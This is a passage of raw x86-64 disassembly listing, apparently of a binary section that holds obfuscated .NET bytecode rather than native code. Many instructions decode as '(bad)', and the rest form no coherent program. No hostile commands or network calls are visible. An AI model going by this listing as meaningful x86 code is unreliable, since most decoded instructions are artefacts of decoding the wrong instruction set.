  404bf1:	ff 5f 1f             	lcall  *0x1f(%rdi)
  404bf4:	18 64 d2 9c          	sbb    %ah,-0x64(%rdx,%rdx,8)
  404bf8:	20 ae 01 00 00 fe    	and    %ch,-0x1ffffff(%rsi)
  404bfe:	0e                   	(bad)
  404bff:	33 00                	xor    (%rax),%eax
  404c01:	17                   	(bad)
  404c02:	3a 79 e8             	cmp    -0x18(%rcx),%bh
  404c05:	ff                   	(bad)
  404c06:	ff                   	(bad)
  404c07:	fe 0c 27             	decb   (%rdi,%riz,1)
  404c0a:	00 20                	add    %ah,(%rax)
  404c0c:	16                   	(bad)
  404c0d:	00 00                	add    %al,(%rax)
  404c0f:	00 20                	add    %ah,(%rax)
  404c11:	69 00 00 00 20 68    	imul   $0x68200000,(%rax),%eax
  404c17:	00 00                	add    %al,(%rax)
  404c19:	00 58 9c             	add    %bl,-0x64(%rax)
  404c1c:	20 a1 00 00 00 38    	and    %ah,0x38000000(%rcx)
  404c22:	56                   	push   %rsi
  404c23:	e8 ff ff fe 0c       	call   0xd3f4c27
  404c28:	27                   	(bad)
  404c29:	00 20                	add    %ah,(%rax)
  404c2b:	10 00                	adc    %al,(%rax)
  404c2d:	00 00                	add    %al,(%rax)
  404c2f:	20 18                	and    %bl,(%rax)
  404c31:	00 00                	add    %al,(%rax)
  404c33:	00 20                	add    %ah,(%rax)
  404c35:	06                   	(bad)
  404c36:	00 00                	add    %al,(%rax)
  404c38:	00 58 9c             	add    %bl,-0x64(%rax)
  404c3b:	20 ea                	and    %ch,%dl
  404c3d:	00 00                	add    %al,(%rax)
  404c3f:	00 38                	add    %bh,(%rax)
  404c41:	37                   	(bad)
  404c42:	e8 ff ff fe 0c       	call   0xd3f4c46
  404c47:	2f                   	(bad)
  404c48:	00 20                	add    %ah,(%rax)
  404c4a:	01 00                	add    %eax,(%rax)
  404c4c:	00 00                	add    %al,(%rax)
  404c4e:	fe 0c 0b             	decb   (%rbx,%rcx,1)
  404c51:	00 9c 20 b7 00 00 00 	add    %bl,0xb7(%rax,%riz,1)
  404c58:	fe 0e                	decb   (%rsi)
  404c5a:	33 00                	xor    (%rax),%eax
  404c5c:	16                   	(bad)
  404c5d:	39 1e                	cmp    %ebx,(%rsi)
  404c5f:	e8 ff ff fe 0c       	call   0xd3f4c63
  404c64:	27                   	(bad)
  404c65:	00 20                	add    %ah,(%rax)
  404c67:	12 00                	adc    (%rax),%al
  404c69:	00 00                	add    %al,(%rax)
  404c6b:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  404c6e:	00 9c 20 39 00 00 00 	add    %bl,0x39(%rax,%riz,1)
  404c75:	38 0a                	cmp    %cl,(%rdx)
  404c77:	e8 ff ff 20 23       	call   0x23614c7b
  404c7c:	00 00                	add    %al,(%rax)
  404c7e:	00 20                	add    %ah,(%rax)
  404c80:	57                   	push   %rdi
  404c81:	00 00                	add    %al,(%rax)
  404c83:	00 58 fe             	add    %bl,-0x2(%rax)
  404c86:	0e                   	(bad)
  404c87:	2b 00                	sub    (%rax),%eax
  404c89:	20 07                	and    %al,(%rdi)
  404c8b:	00 00                	add    %al,(%rax)
  404c8d:	00 38                	add    %bh,(%rax)
  404c8f:	e9 e7 ff ff 38       	jmp    0x39404c7b
  404c94:	a3 1d 00 00 13 00 20 	movabs %eax,0xb320001300001d
  404c9b:	b3 00 
  404c9d:	00 00                	add    %al,(%rax)
  404c9f:	fe 0e                	decb   (%rsi)
  404ca1:	33 00                	xor    (%rax),%eax
  404ca3:	38 9d 1d 00 00 3a    	cmp    %bl,0x3a00001d(%rbp)
  404ca9:	f4                   	hlt
  404caa:	16                   	(bad)
  404cab:	00 00                	add    %al,(%rax)
  404cad:	38 ce                	cmp    %cl,%dh
  404caf:	e7 ff                	out    %eax,$0xff
  404cb1:	ff 20                	jmp    *(%rax)
  404cb3:	00 00                	add    %al,(%rax)
  404cb5:	00 00                	add    %al,(%rax)
  404cb7:	20 5c 00 00          	and    %bl,0x0(%rax,%rax,1)
  404cbb:	00 58 fe             	add    %bl,-0x2(%rax)
  404cbe:	0e                   	(bad)
  404cbf:	2b 00                	sub    (%rax),%eax
  404cc1:	20 2a                	and    %ch,(%rdx)
  404cc3:	00 00                	add    %al,(%rax)
  404cc5:	00 38                	add    %bh,(%rax)
  404cc7:	b9 e7 ff ff 38       	mov    $0x38ffffe7,%ecx
  404ccc:	47 e6 ff             	rex.RXB out %al,$0xff
  404ccf:	ff 11                	call   *(%rcx)
  404cd1:	28 11                	sub    %dl,(%rcx)
  404cd3:	2d 5d 13 2e 20       	sub    $0x202e135d,%eax
  404cd8:	6e                   	outsb  (%rsi),(%dx)
  404cd9:	01 00                	add    %eax,(%rax)
  404cdb:	00 38                	add    %bh,(%rax)
  404cdd:	a3 e7 ff ff 11 25 1f 	movabs %eax,0x110f1f2511ffffe7
  404ce4:	0f 11 
  404ce6:	19 1d 91 9c 20 02    	sbb    %ebx,0x2209c91(%rip)        # 0x260e97d
  404cec:	00 00                	add    %al,(%rax)
  404cee:	00 38                	add    %bh,(%rax)
  404cf0:	88 e7                	mov    %ah,%bh
  404cf2:	ff                   	(bad)
  404cf3:	ff                   	(bad)
  404cf4:	fe 0c 27             	decb   (%rdi,%riz,1)
  404cf7:	00 20                	add    %ah,(%rax)
  404cf9:	0e                   	(bad)
  404cfa:	00 00                	add    %al,(%rax)
  404cfc:	00 fe                	add    %bh,%dh
  404cfe:	0c 2b                	or     $0x2b,%al
  404d00:	00 9c 20 10 01 00 00 	add    %bl,0x110(%rax,%riz,1)
  404d07:	38 78 e7             	cmp    %bh,-0x19(%rax)
  404d0a:	ff                   	(bad)
  404d0b:	ff                   	(bad)
  404d0c:	fe 0c 27             	decb   (%rdi,%riz,1)
  404d0f:	00 20                	add    %ah,(%rax)
  404d11:	0a 00                	or     (%rax),%al
  404d13:	00 00                	add    %al,(%rax)
  404d15:	20 f9                	and    %bh,%cl
  404d17:	00 00                	add    %al,(%rax)
  404d19:	00 20                	add    %ah,(%rax)
  404d1b:	53                   	push   %rbx
  404d1c:	00 00                	add    %al,(%rax)
  404d1e:	00 59 9c             	add    %bl,-0x64(%rcx)
  404d21:	20 42 00             	and    %al,0x0(%rdx)
  404d24:	00 00                	add    %al,(%rax)
  404d26:	38 51 e7             	cmp    %dl,-0x19(%rcx)
  404d29:	ff                   	(bad)
  404d2a:	ff 20                	jmp    *(%rax)
  404d2c:	41 00 00             	add    %al,(%r8)
  404d2f:	00 20                	add    %ah,(%rax)
  404d31:	7a 00                	jp     0x404d33
  404d33:	00 00                	add    %al,(%rax)
  404d35:	58                   	pop    %rax
  404d36:	fe 0e                	decb   (%rsi)
  404d38:	0b 00                	or     (%rax),%eax
  404d3a:	20 f0                	and    %dh,%al
  404d3c:	00 00                	add    %al,(%rax)
  404d3e:	00 fe                	add    %bh,%dh
  404d40:	0e                   	(bad)
  404d41:	33 00                	xor    (%rax),%eax
  404d43:	17                   	(bad)
  404d44:	3a 37                	cmp    (%rdi),%dh
  404d46:	e7 ff                	out    %eax,$0xff
  404d48:	ff                   	(bad)
  404d49:	fe 0c 27             	decb   (%rdi,%riz,1)
  404d4c:	00 20                	add    %ah,(%rax)
  404d4e:	14 00                	adc    $0x0,%al
  404d50:	00 00                	add    %al,(%rax)
  404d52:	20 5f 00             	and    %bl,0x0(%rdi)
  404d55:	00 00                	add    %al,(%rax)
  404d57:	20 0c 00             	and    %cl,(%rax,%rax,1)
  404d5a:	00 00                	add    %al,(%rax)
  404d5c:	59                   	pop    %rcx
  404d5d:	9c                   	pushf
  404d5e:	20 31                	and    %dh,(%rcx)
  404d60:	00 00                	add    %al,(%rax)
  404d62:	00 38                	add    %bh,(%rax)
  404d64:	14 e7                	adc    $0xe7,%al
  404d66:	ff                   	(bad)
  404d67:	ff                   	(bad)
  404d68:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  404d6b:	00 20                	add    %ah,(%rax)
  404d6d:	0f 00 00             	sldt   (%rax)
  404d70:	00 20                	add    %ah,(%rax)
  404d72:	50                   	push   %rax
  404d73:	00 00                	add    %al,(%rax)
  404d75:	00 20                	add    %ah,(%rax)
  404d77:	5c                   	pop    %rsp
  404d78:	00 00                	add    %al,(%rax)
  404d7a:	00 58 9c             	add    %bl,-0x64(%rax)
  404d7d:	20 72 01             	and    %dh,0x1(%rdx)
  404d80:	00 00                	add    %al,(%rax)
  404d82:	fe 0e                	decb   (%rsi)
  404d84:	33 00                	xor    (%rax),%eax
  404d86:	38 f5                	cmp    %dh,%ch
  404d88:	e6 ff                	out    %al,$0xff
  404d8a:	ff 20                	jmp    *(%rax)
  404d8c:	ad                   	lods   (%rsi),%eax
  404d8d:	00 00                	add    %al,(%rax)
  404d8f:	00 20                	add    %ah,(%rax)
  404d91:	39 00                	cmp    %eax,(%rax)
  404d93:	00 00                	add    %al,(%rax)
  404d95:	59                   	pop    %rcx
  404d96:	fe 0e                	decb   (%rsi)
  404d98:	1e                   	(bad)
  404d99:	00 20                	add    %ah,(%rax)
  404d9b:	9a                   	(bad)
  404d9c:	00 00                	add    %al,(%rax)
  404d9e:	00 fe                	add    %bh,%dh
  404da0:	0e                   	(bad)
  404da1:	33 00                	xor    (%rax),%eax
  404da3:	38 a7 1c 00 00 39    	cmp    %ah,0x3900001c(%rdi)
  404da9:	d3 e6                	shl    %cl,%esi
  404dab:	ff                   	(bad)
  404dac:	ff 20                	jmp    *(%rax)
  404dae:	02 00                	add    (%rax),%al
  404db0:	00 00                	add    %al,(%rax)
  404db2:	20 26                	and    %ah,(%rsi)
  404db4:	00 00                	add    %al,(%rax)
  404db6:	00 58 fe             	add    %bl,-0x2(%rax)
  404db9:	0e                   	(bad)
  404dba:	0c 00                	or     $0x0,%al
  404dbc:	20 89 01 00 00 fe    	and    %cl,-0x1ffffff(%rcx)
  404dc2:	0e                   	(bad)
  404dc3:	33 00                	xor    (%rax),%eax
  404dc5:	38 8f 1c 00 00 39    	cmp    %cl,0x3900001c(%rdi)
  404dcb:	b1 e6                	mov    $0xe6,%cl
  404dcd:	ff                   	(bad)
  404dce:	ff                   	(bad)
  404dcf:	fe 0c 27             	decb   (%rdi,%riz,1)
  404dd2:	00 20                	add    %ah,(%rax)
  404dd4:	1d 00 00 00 20       	sbb    $0x20000000,%eax
  404dd9:	54                   	push   %rsp
  404dda:	00 00                	add    %al,(%rax)
  404ddc:	00 20                	add    %ah,(%rax)
  404dde:	0c 00                	or     $0x0,%al
  404de0:	00 00                	add    %al,(%rax)
  404de2:	58                   	pop    %rax
  404de3:	9c                   	pushf
  404de4:	20 91 00 00 00 fe    	and    %dl,-0x2000000(%rcx)
  404dea:	0e                   	(bad)
  404deb:	33 00                	xor    (%rax),%eax
  404ded:	38 8e e6 ff ff 20    	cmp    %cl,0x20ffffe6(%rsi)
  404df3:	37                   	(bad)
  404df4:	00 00                	add    %al,(%rax)
  404df6:	00 20                	add    %ah,(%rax)
  404df8:	0d 00 00 00 58       	or     $0x58000000,%eax
  404dfd:	fe 0e                	decb   (%rsi)
  404dff:	0c 00                	or     $0x0,%al
  404e01:	20 ce                	and    %cl,%dh
  404e03:	00 00                	add    %al,(%rax)
  404e05:	00 38                	add    %bh,(%rax)
  404e07:	71 e6                	jno    0x404def
  404e09:	ff                   	(bad)
  404e0a:	ff                   	(bad)
  404e0b:	fe 0c 27             	decb   (%rdi,%riz,1)
  404e0e:	00 20                	add    %ah,(%rax)
  404e10:	10 00                	adc    %al,(%rax)
  404e12:	00 00                	add    %al,(%rax)
  404e14:	20 cd                	and    %cl,%ch
  404e16:	00 00                	add    %al,(%rax)
  404e18:	00 20                	add    %ah,(%rax)
  404e1a:	44 00 00             	add    %r8b,(%rax)
  404e1d:	00 59 9c             	add    %bl,-0x64(%rcx)
  404e20:	20 6b 01             	and    %ch,0x1(%rbx)
  404e23:	00 00                	add    %al,(%rax)
  404e25:	38 5a e6             	cmp    %bl,-0x1a(%rdx)
  404e28:	ff                   	(bad)
  404e29:	ff 20                	jmp    *(%rax)
  404e2b:	20 00                	and    %al,(%rax)
  404e2d:	00 00                	add    %al,(%rax)
  404e2f:	8d 11                	lea    (%rcx),%edx
  404e31:	00 00                	add    %al,(%rax)
  404e33:	01 fe                	add    %edi,%esi
  404e35:	0e                   	(bad)
  404e36:	27                   	(bad)
  404e37:	00 20                	add    %ah,(%rax)
  404e39:	83 01 00             	addl   $0x0,(%rcx)
  404e3c:	00 38                	add    %bh,(%rax)
  404e3e:	3a e6                	cmp    %dh,%ah
  404e40:	ff                   	(bad)
  404e41:	ff                   	(bad)
  404e42:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  404e45:	00 20                	add    %ah,(%rax)
  404e47:	02 00                	add    (%rax),%al
  404e49:	00 00                	add    %al,(%rax)
  404e4b:	fe 0c 1e             	decb   (%rsi,%rbx,1)
  404e4e:	00 9c 20 65 01 00 00 	add    %bl,0x165(%rax,%riz,1)
  404e55:	38 22                	cmp    %ah,(%rdx)
  404e57:	e6 ff                	out    %al,$0xff
  404e59:	ff 11                	call   *(%rcx)
  404e5b:	0a 11                	or     (%rcx),%dl
  404e5d:	1c 58                	sbb    $0x58,%al
  404e5f:	13 0a                	adc    (%rdx),%ecx
  404e61:	20 22                	and    %ah,(%rdx)
  404e63:	01 00                	add    %eax,(%rax)
  404e65:	00 fe                	add    %bh,%dh
  404e67:	0e                   	(bad)
  404e68:	33 00                	xor    (%rax),%eax
  404e6a:	38 11                	cmp    %dl,(%rcx)
  404e6c:	e6 ff                	out    %al,$0xff
  404e6e:	ff 20                	jmp    *(%rax)
  404e70:	c3                   	ret
  404e71:	00 00                	add    %al,(%rax)
  404e73:	00 20                	add    %ah,(%rax)
  404e75:	54                   	push   %rsp
  404e76:	00 00                	add    %al,(%rax)
  404e78:	00 59 fe             	add    %bl,-0x2(%rcx)
  404e7b:	0e                   	(bad)
  404e7c:	0c 00                	or     $0x0,%al
  404e7e:	20 8f 00 00 00 38    	and    %cl,0x38000000(%rdi)
  404e84:	f4                   	hlt
  404e85:	e5 ff                	in     $0xff,%eax
  404e87:	ff 11                	call   *(%rcx)
  404e89:	0a 11                	or     (%rcx),%dl
  404e8b:	0e                   	(bad)
  404e8c:	61                   	(bad)
  404e8d:	13 11                	adc    (%rcx),%edx
  404e8f:	20 36                	and    %dh,(%rsi)
  404e91:	01 00                	add    %eax,(%rax)
  404e93:	00 fe                	add    %bh,%dh
  404e95:	0e                   	(bad)
  404e96:	33 00                	xor    (%rax),%eax
  404e98:	38 e3                	cmp    %ah,%bl
  404e9a:	e5 ff                	in     $0xff,%eax
  404e9c:	ff 20                	jmp    *(%rax)
  404e9e:	d8 00                	fadds  (%rax)
  404ea0:	00 00                	add    %al,(%rax)
  404ea2:	20 48 00             	and    %cl,0x0(%rax)
  404ea5:	00 00                	add    %al,(%rax)
  404ea7:	59                   	pop    %rcx
  404ea8:	fe 0e                	decb   (%rsi)
  404eaa:	2b 00                	sub    (%rax),%eax
  404eac:	20 5d 00             	and    %bl,0x0(%rbp)
  404eaf:	00 00                	add    %al,(%rax)
  404eb1:	38 ce                	cmp    %cl,%dh
  404eb3:	e5 ff                	in     $0xff,%eax
  404eb5:	ff 11                	call   *(%rcx)
  404eb7:	07                   	(bad)
  404eb8:	38 a6 1b 00 00 20    	cmp    %ah,0x2000001b(%rsi)
  404ebe:	a0 01 00 00 38 b5 e5 	movabs 0xffffe5b538000001,%al
  404ec5:	ff ff 
  404ec7:	fe 0c 27             	decb   (%rdi,%riz,1)
  404eca:	00 20                	add    %ah,(%rax)
  404ecc:	1c 00                	sbb    $0x0,%al
  404ece:	00 00                	add    %al,(%rax)
  404ed0:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  404ed3:	00 9c 20 3b 01 00 00 	add    %bl,0x13b(%rax,%riz,1)
  404eda:	38 a5 e5 ff ff 38    	cmp    %ah,0x38ffffe5(%rbp)
  404ee0:	89 1b                	mov    %ebx,(%rbx)
  404ee2:	00 00                	add    %al,(%rax)
  404ee4:	13 21                	adc    (%rcx),%esp
  404ee6:	20 14 01             	and    %dl,(%rcx,%rax,1)
  404ee9:	00 00                	add    %al,(%rax)
  404eeb:	38 8c e5 ff ff 20 a8 	cmp    %cl,-0x57df0001(%rbp,%riz,8)
  404ef2:	00 00                	add    %al,(%rax)
  404ef4:	00 20                	add    %ah,(%rax)
  404ef6:	67 00 00             	add    %al,(%eax)
  404ef9:	00 59 fe             	add    %bl,-0x2(%rcx)
  404efc:	0e                   	(bad)
  404efd:	0c 00                	or     $0x0,%al
  404eff:	20 5f 01             	and    %bl,0x1(%rdi)
  404f02:	00 00                	add    %al,(%rax)
  404f04:	fe 0e                	decb   (%rsi)
  404f06:	33 00                	xor    (%rax),%eax
  404f08:	16                   	(bad)
  404f09:	39 72 e5             	cmp    %esi,-0x1b(%rdx)
  404f0c:	ff                   	(bad)
  404f0d:	ff                   	(bad)
  404f0e:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  404f11:	00 20                	add    %ah,(%rax)
  404f13:	04 00                	add    $0x0,%al
  404f15:	00 00                	add    %al,(%rax)
  404f17:	fe 0c 1e             	decb   (%rsi,%rbx,1)
  404f1a:	00 9c 20 9c 01 00 00 	add    %bl,0x19c(%rax,%riz,1)
  404f21:	fe 0e                	decb   (%rsi)
  404f23:	33 00                	xor    (%rax),%eax
  404f25:	38 4d 1b             	cmp    %cl,0x1b(%rbp)
  404f28:	00 00                	add    %al,(%rax)
  404f2a:	39 09                	cmp    %ecx,(%rcx)
  404f2c:	f0 ff                	lock (bad)
  404f2e:	ff                   	(bad)
  404f2f:	38 4c e5 ff          	cmp    %cl,-0x1(%rbp,%riz,8)
  404f33:	ff                   	(bad)
  404f34:	fe 0c 27             	decb   (%rdi,%riz,1)
  404f37:	00 20                	add    %ah,(%rax)
  404f39:	06                   	(bad)
  404f3a:	00 00                	add    %al,(%rax)
  404f3c:	00 fe                	add    %bh,%dh
  404f3e:	0c 0c                	or     $0xc,%al
  404f40:	00 9c 20 07 01 00 00 	add    %bl,0x107(%rax,%riz,1)
  404f47:	fe 0e                	decb   (%rsi)
  404f49:	33 00                	xor    (%rax),%eax
  404f4b:	38 31                	cmp    %dh,(%rcx)
  404f4d:	1b 00                	sbb    (%rax),%eax
  404f4f:	00 3a                	add    %bh,(%rdx)
  404f51:	a9 f1 ff ff 38       	test   $0x38fffff1,%eax
  404f56:	26 e5 ff             	es in  $0xff,%eax
  404f59:	ff                   	(bad)
  404f5a:	fe 0c 27             	decb   (%rdi,%riz,1)
  404f5d:	00 20                	add    %ah,(%rax)
  404f5f:	02 00                	add    (%rax),%al
  404f61:	00 00                	add    %al,(%rax)
  404f63:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  404f66:	00 9c 20 16 01 00 00 	add    %bl,0x116(%rax,%riz,1)
  404f6d:	38 12                	cmp    %dl,(%rdx)
  404f6f:	e5 ff                	in     $0xff,%eax
  404f71:	ff 11                	call   *(%rcx)
  404f73:	00 11                	add    %dl,(%rcx)
  404f75:	06                   	(bad)
  404f76:	17                   	(bad)
  404f77:	38 0f                	cmp    %cl,(%rdi)
  404f79:	1b 00                	sbb    (%rax),%eax
  404f7b:	00 13                	add    %dl,(%rbx)
  404f7d:	07                   	(bad)
  404f7e:	20 26                	and    %ah,(%rsi)
  404f80:	01 00                	add    %eax,(%rax)
  404f82:	00 38                	add    %bh,(%rax)
  404f84:	f4                   	hlt
  404f85:	e4 ff                	in     $0xff,%al
  404f87:	ff                   	(bad)
  404f88:	fe 0c 27             	decb   (%rdi,%riz,1)
  404f8b:	00 20                	add    %ah,(%rax)
  404f8d:	09 00                	or     %eax,(%rax)
  404f8f:	00 00                	add    %al,(%rax)
  404f91:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  404f94:	00 9c 20 19 00 00 00 	add    %bl,0x19(%rax,%riz,1)
  404f9b:	38 e4                	cmp    %ah,%ah
  404f9d:	e4 ff                	in     $0xff,%al
  404f9f:	ff 20                	jmp    *(%rax)
  404fa1:	3e 00 00             	ds add %al,(%rax)
  404fa4:	00 20                	add    %ah,(%rax)
  404fa6:	01 00                	add    %eax,(%rax)
  404fa8:	00 00                	add    %al,(%rax)
  404faa:	58                   	pop    %rax
  404fab:	fe 0e                	decb   (%rsi)
  404fad:	2b 00                	sub    (%rax),%eax
  404faf:	20 5b 01             	and    %bl,0x1(%rbx)
  404fb2:	00 00                	add    %al,(%rax)
  404fb4:	fe 0e                	decb   (%rsi)
  404fb6:	33 00                	xor    (%rax),%eax
  404fb8:	38 d8                	cmp    %bl,%al
  404fba:	1a 00                	sbb    (%rax),%al
  404fbc:	00 3a                	add    %bh,(%rdx)
  404fbe:	be e4 ff ff fe       	mov    $0xfeffffe4,%esi
  404fc3:	0c 27                	or     $0x27,%al
  404fc5:	00 20                	add    %ah,(%rax)
  404fc7:	12 00                	adc    (%rax),%al
  404fc9:	00 00                	add    %al,(%rax)
  404fcb:	20 8b 00 00 00 20    	and    %cl,0x20000000(%rbx)
  404fd1:	3c 00                	cmp    $0x0,%al
  404fd3:	00 00                	add    %al,(%rax)
  404fd5:	59                   	pop    %rcx
  404fd6:	9c                   	pushf
  404fd7:	20 6f 00             	and    %ch,0x0(%rdi)
  404fda:	00 00                	add    %al,(%rax)
  404fdc:	fe 0e                	decb   (%rsi)
  404fde:	33 00                	xor    (%rax),%eax
  404fe0:	38 ba 1a 00 00 3a    	cmp    %bh,0x3a00001a(%rdx)
  404fe6:	d2 e2                	shl    %cl,%dl
  404fe8:	ff                   	(bad)
  404fe9:	ff                   	(bad)
  404fea:	38 91 e4 ff ff fe    	cmp    %dl,-0x100001c(%rcx)
  404ff0:	0c 27                	or     $0x27,%al
  404ff2:	00 20                	add    %ah,(%rax)
  404ff4:	14 00                	adc    $0x0,%al
  404ff6:	00 00                	add    %al,(%rax)
  404ff8:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  404ffb:	00 9c 20 d7 00 00 00 	add    %bl,0xd7(%rax,%riz,1)
  405002:	38 7d e4             	cmp    %bh,-0x1c(%rbp)
  405005:	ff                   	(bad)
  405006:	ff                   	(bad)
  405007:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  40500a:	00 20                	add    %ah,(%rax)
  40500c:	0f 00 00             	sldt   (%rax)
  40500f:	00 fe                	add    %bh,%dh
  405011:	0c 1e                	or     $0x1e,%al
  405013:	00 9c 20 0d 01 00 00 	add    %bl,0x10d(%rax,%riz,1)
  40501a:	38 5d e4             	cmp    %bl,-0x1c(%rbp)
  40501d:	ff                   	(bad)
  40501e:	ff                   	(bad)
  40501f:	fe 0c 27             	decb   (%rdi,%riz,1)
  405022:	00 20                	add    %ah,(%rax)
  405024:	0a 00                	or     (%rax),%al
  405026:	00 00                	add    %al,(%rax)
  405028:	20 a8 00 00 00 20    	and    %ch,0x20000000(%rax)
  40502e:	44 00 00             	add    %r8b,(%rax)
  405031:	00 58 9c             	add    %bl,-0x64(%rax)
  405034:	20 63 01             	and    %ah,0x1(%rbx)
  405037:	00 00                	add    %al,(%rax)
  405039:	fe 0e                	decb   (%rsi)
  40503b:	33 00                	xor    (%rax),%eax
  40503d:	17                   	(bad)
  40503e:	3a 3d e4 ff ff 20    	cmp    0x20ffffe4(%rip),%bh        # 0x21405028
  405044:	98                   	cwtl
  405045:	00 00                	add    %al,(%rax)
  405047:	00 20                	add    %ah,(%rax)
  405049:	32 00                	xor    (%rax),%al
  40504b:	00 00                	add    %al,(%rax)
  40504d:	59                   	pop    %rcx
  40504e:	fe 0e                	decb   (%rsi)
  405050:	2b 00                	sub    (%rax),%eax
  405052:	20 6e 00             	and    %ch,0x0(%rsi)
  405055:	00 00                	add    %al,(%rax)
  405057:	fe 0e                	decb   (%rsi)
  405059:	33 00                	xor    (%rax),%eax
  40505b:	16                   	(bad)
  40505c:	39 1f                	cmp    %ebx,(%rdi)
  40505e:	e4 ff                	in     $0xff,%al
  405060:	ff                   	(bad)
  405061:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  405064:	00 20                	add    %ah,(%rax)
  405066:	01 00                	add    %eax,(%rax)
  405068:	00 00                	add    %al,(%rax)
  40506a:	fe 0c 1e             	decb   (%rsi,%rbx,1)
  40506d:	00 9c 20 58 01 00 00 	add    %bl,0x158(%rax,%riz,1)
  405074:	fe 0e                	decb   (%rsi)
  405076:	33 00                	xor    (%rax),%eax
  405078:	38 2c 1a             	cmp    %ch,(%rdx,%rbx,1)
  40507b:	00 00                	add    %al,(%rax)
  40507d:	39 9c 15 00 00 38 f9 	cmp    %ebx,-0x6c80000(%rbp,%rdx,1)
  405084:	e3 ff                	jrcxz  0x405085
  405086:	ff 11                	call   *(%rcx)
  405088:	24 11                	and    $0x11,%al
  40508a:	09 19                	or     %ebx,(%rcx)
  40508c:	58                   	pop    %rax
  40508d:	e0 91                	loopne 0x405020
  40508f:	1f                   	(bad)
  405090:	18 62 11             	sbb    %ah,0x11(%rdx)
  405093:	24 11                	and    $0x11,%al
  405095:	09 18                	or     %ebx,(%rax)
  405097:	58                   	pop    %rax
  405098:	e0 91                	loopne 0x40502b
  40509a:	1f                   	(bad)
  40509b:	10 62 60             	adc    %ah,0x60(%rdx)
  40509e:	11 24 11             	adc    %esp,(%rcx,%rdx,1)
  4050a1:	09 17                	or     %edx,(%rdi)
  4050a3:	58                   	pop    %rax
  4050a4:	e0 91                	loopne 0x405037
  4050a6:	1e                   	(bad)
  4050a7:	62                   	(bad)
  4050a8:	60                   	(bad)
  4050a9:	11 24 11             	adc    %esp,(%rcx,%rdx,1)
  4050ac:	09 e0                	or     %esp,%eax
  4050ae:	91                   	xchg   %eax,%ecx
  4050af:	60                   	(bad)
  4050b0:	13 0e                	adc    (%rsi),%ecx
  4050b2:	20 82 00 00 00 38    	and    %al,0x38000000(%rdx)
  4050b8:	c0 e3 ff             	shl    $0xff,%bl
  4050bb:	ff                   	(bad)
  4050bc:	fe 0c 27             	decb   (%rdi,%riz,1)
  4050bf:	00 20                	add    %ah,(%rax)
  4050c1:	02 00                	add    (%rax),%al
  4050c3:	00 00                	add    %al,(%rax)
  4050c5:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  4050c8:	00 9c 20 6a 01 00 00 	add    %bl,0x16a(%rax,%riz,1)
  4050cf:	38 b0 e3 ff ff fe    	cmp    %dh,-0x100001d(%rax)
  4050d5:	0c 2f                	or     $0x2f,%al
  4050d7:	00 20                	add    %ah,(%rax)
  4050d9:	02 00                	add    (%rax),%al
  4050db:	00 00                	add    %al,(%rax)
  4050dd:	fe 0c 0b             	decb   (%rbx,%rcx,1)
  4050e0:	00 9c 20 f5 00 00 00 	add    %bl,0xf5(%rax,%riz,1)
  4050e7:	fe 0e                	decb   (%rsi)
  4050e9:	33 00                	xor    (%rax),%eax
  4050eb:	17                   	(bad)
  4050ec:	3a 8f e3 ff ff fe    	cmp    -0x100001d(%rdi),%cl
  4050f2:	0c 27                	or     $0x27,%al
  4050f4:	00 20                	add    %ah,(%rax)
  4050f6:	19 00                	sbb    %eax,(%rax)
  4050f8:	00 00                	add    %al,(%rax)
  4050fa:	20 5b 00             	and    %bl,0x0(%rbx)
  4050fd:	00 00                	add    %al,(%rax)
  4050ff:	20 55 00             	and    %dl,0x0(%rbp)
  405102:	00 00                	add    %al,(%rax)
  405104:	58                   	pop    %rax
  405105:	9c                   	pushf
  405106:	20 c3                	and    %al,%bl
  405108:	00 00                	add    %al,(%rax)
  40510a:	00 fe                	add    %bh,%dh
  40510c:	0e                   	(bad)
  40510d:	33 00                	xor    (%rax),%eax
  40510f:	38 9f 19 00 00 3a    	cmp    %bl,0x3a000019(%rdi)
  405115:	26 f1                	es int1
  405117:	ff                   	(bad)
  405118:	ff                   	(bad)
  405119:	38 62 e3             	cmp    %ah,-0x1d(%rdx)
  40511c:	ff                   	(bad)
  40511d:	ff                   	(bad)
  40511e:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  405121:	00 20                	add    %ah,(%rax)
  405123:	02 00                	add    (%rax),%al
  405125:	00 00                	add    %al,(%rax)
  405127:	20 d0                	and    %dl,%al
  405129:	00 00                	add    %al,(%rax)
  40512b:	00 20                	add    %ah,(%rax)
  40512d:	27                   	(bad)
  40512e:	00 00                	add    %al,(%rax)
  405130:	00 58 9c             	add    %bl,-0x64(%rax)
  405133:	20 7f 01             	and    %bh,0x1(%rdi)
  405136:	00 00                	add    %al,(%rax)
  405138:	38 3f                	cmp    %bh,(%rdi)
  40513a:	e3 ff                	jrcxz  0x40513b
  40513c:	ff                   	(bad)
  40513d:	fe 0c 27             	decb   (%rdi,%riz,1)
  405140:	00 20                	add    %ah,(%rax)
  405142:	1d 00 00 00 fe       	sbb    $0xfe000000,%eax
  405147:	0c 2b                	or     $0x2b,%al
  405149:	00 9c 20 8b 00 00 00 	add    %bl,0x8b(%rax,%riz,1)
  405150:	fe 0e                	decb   (%rsi)
  405152:	33 00                	xor    (%rax),%eax
  405154:	38 27                	cmp    %ah,(%rdi)
  405156:	e3 ff                	jrcxz  0x405157
  405158:	ff 20                	jmp    *(%rax)
  40515a:	66 00 00             	data16 add %al,(%rax)
  40515d:	00 20                	add    %ah,(%rax)
  40515f:	09 00                	or     %eax,(%rax)
  405161:	00 00                	add    %al,(%rax)
  405163:	58                   	pop    %rax
  405164:	fe 0e                	decb   (%rsi)
  405166:	1e                   	(bad)
  405167:	00 20                	add    %ah,(%rax)
  405169:	84 01                	test   %al,(%rcx)
  40516b:	00 00                	add    %al,(%rax)
  40516d:	38 0a                	cmp    %cl,(%rdx)
  40516f:	e3 ff                	jrcxz  0x405170
  405171:	ff                   	(bad)
  405172:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  405175:	00 20                	add    %ah,(%rax)
  405177:	07                   	(bad)
